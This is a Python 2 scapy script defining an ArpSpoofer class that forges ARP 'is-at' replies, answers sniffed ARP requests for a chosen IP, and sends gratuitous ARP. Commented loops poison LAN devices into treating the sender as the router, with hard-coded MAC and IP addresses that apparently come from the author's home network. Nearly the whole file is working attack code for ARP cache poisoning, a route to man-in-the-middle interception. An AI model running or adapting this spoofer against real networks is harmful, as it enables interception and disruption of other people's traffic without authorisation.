from scapy.all import *
import time

class ArpSpoofer:
  """
  Creates an object that creates spoofed ARP packets
  """
  def __init__(self):
    self.op = 2 # Default op set to 2: "is-at". 1 is for "who-has"
    self.fake_arp_ip = "0.0.0.0"  

  def spoof(self, victim_hwdst, victim_pdst, spoof_ip):
    a = ARP()
    a.op = self.op
    a.hwdst = victim_hwdst
    a.pdst = victim_pdst
    a.psrc = spoof_ip # spoof_ip is the IP you're pretending to be

    a.show()
    send(a)

  def send_malformed(self, victim_hwdst, victim_pdst, spoof_ip):
    pkt = Ether()/ARP()
    a = pkt[ARP]

    a.op = 2
    a.hwdst = victim_hwdst
    a.pdst = victim_pdst
    a.psrc = spoof_ip
  
    pkt.show()
    send(pkt)

  def respond_to_arp(self, ip_addr):
    self.fake_arp_ip = ip_addr

    # Sniff and if the IP address matches, send a fake ARP reply
    sniff(prn=self.arp_spoof_callback, filter="arp")

  def arp_spoof_callback(self, pkt):
    if pkt[ARP].op == 1 and pkt[ARP].pdst == self.fake_arp_ip:

      victim_mac = pkt[ARP].hwsrc
      victim_ip = pkt[ARP].psrc

      self.spoof(victim_mac, victim_ip, self.fake_arp_ip)
      # print victim_mac, victim_ip     

      # spoof_arp_response = Ether()/ARP()
      # e = spoof_arp_response[Ether]
      # a = spoof_arp_response[ARP]

      # print e.src

      # a.op = 2
      # a.psrc = self.fake_arp_ip
      # a.hwdst = victim_mac
      # # a.pdst = victim_ip
      # a.pdst = "192.168.0.101"

      # spoof_arp_response.show()

      # send(spoof_arp_response)

  def testing(self):
    print "hello"
    spoof_arp_response = Ether()/ARP()
    e = spoof_arp_response[Ether]
    a = spoof_arp_response[ARP]


    a.op = 2
    a.psrc = "192.168.1.141"
    a.hwdst = "b8:e8:56:2c:f3:f8"
    a.pdst = "192.168.1.141"

    spoof_arp_response.show()

    send(spoof_arp_response)

  def gratuitous_arp(self, spoof_ip):
    a = ARP()
    a.op = self.op
    a.psrc = spoof_ip

    send(a)

spoofer = ArpSpoofer()
# spoofer.testing()
spoofer.respond_to_arp("192.168.0.103")
# while(True):
#   spoofer.gratuitous_arp("192.168.0.1")

# while(True):
#   spoofer.spoof("b8:e8:56:2c:f3:f8", "192.168.1.141", "192.168.1.144")
#   time.sleep(1)

# while (True):
#   spoofer.send_malformed("cc:3a:61:e2:2e:42", "192.168.0.5", "192.168.0.1")
#   # spoofer.spoof("cc:3a:61:e2:2e:42", "192.168.0.5", "192.168.0.1")
#   time.sleep(1)

# while(True):
#   # Spoofing my iphone that im the router
#   # spoofer.spoof("48:43:7c:d6:f6:bd", "192.168.0.100", "192.168.0.1")
#   spoofer.gratuitous_arp("192.168.0.101")
#   time.sleep(1)
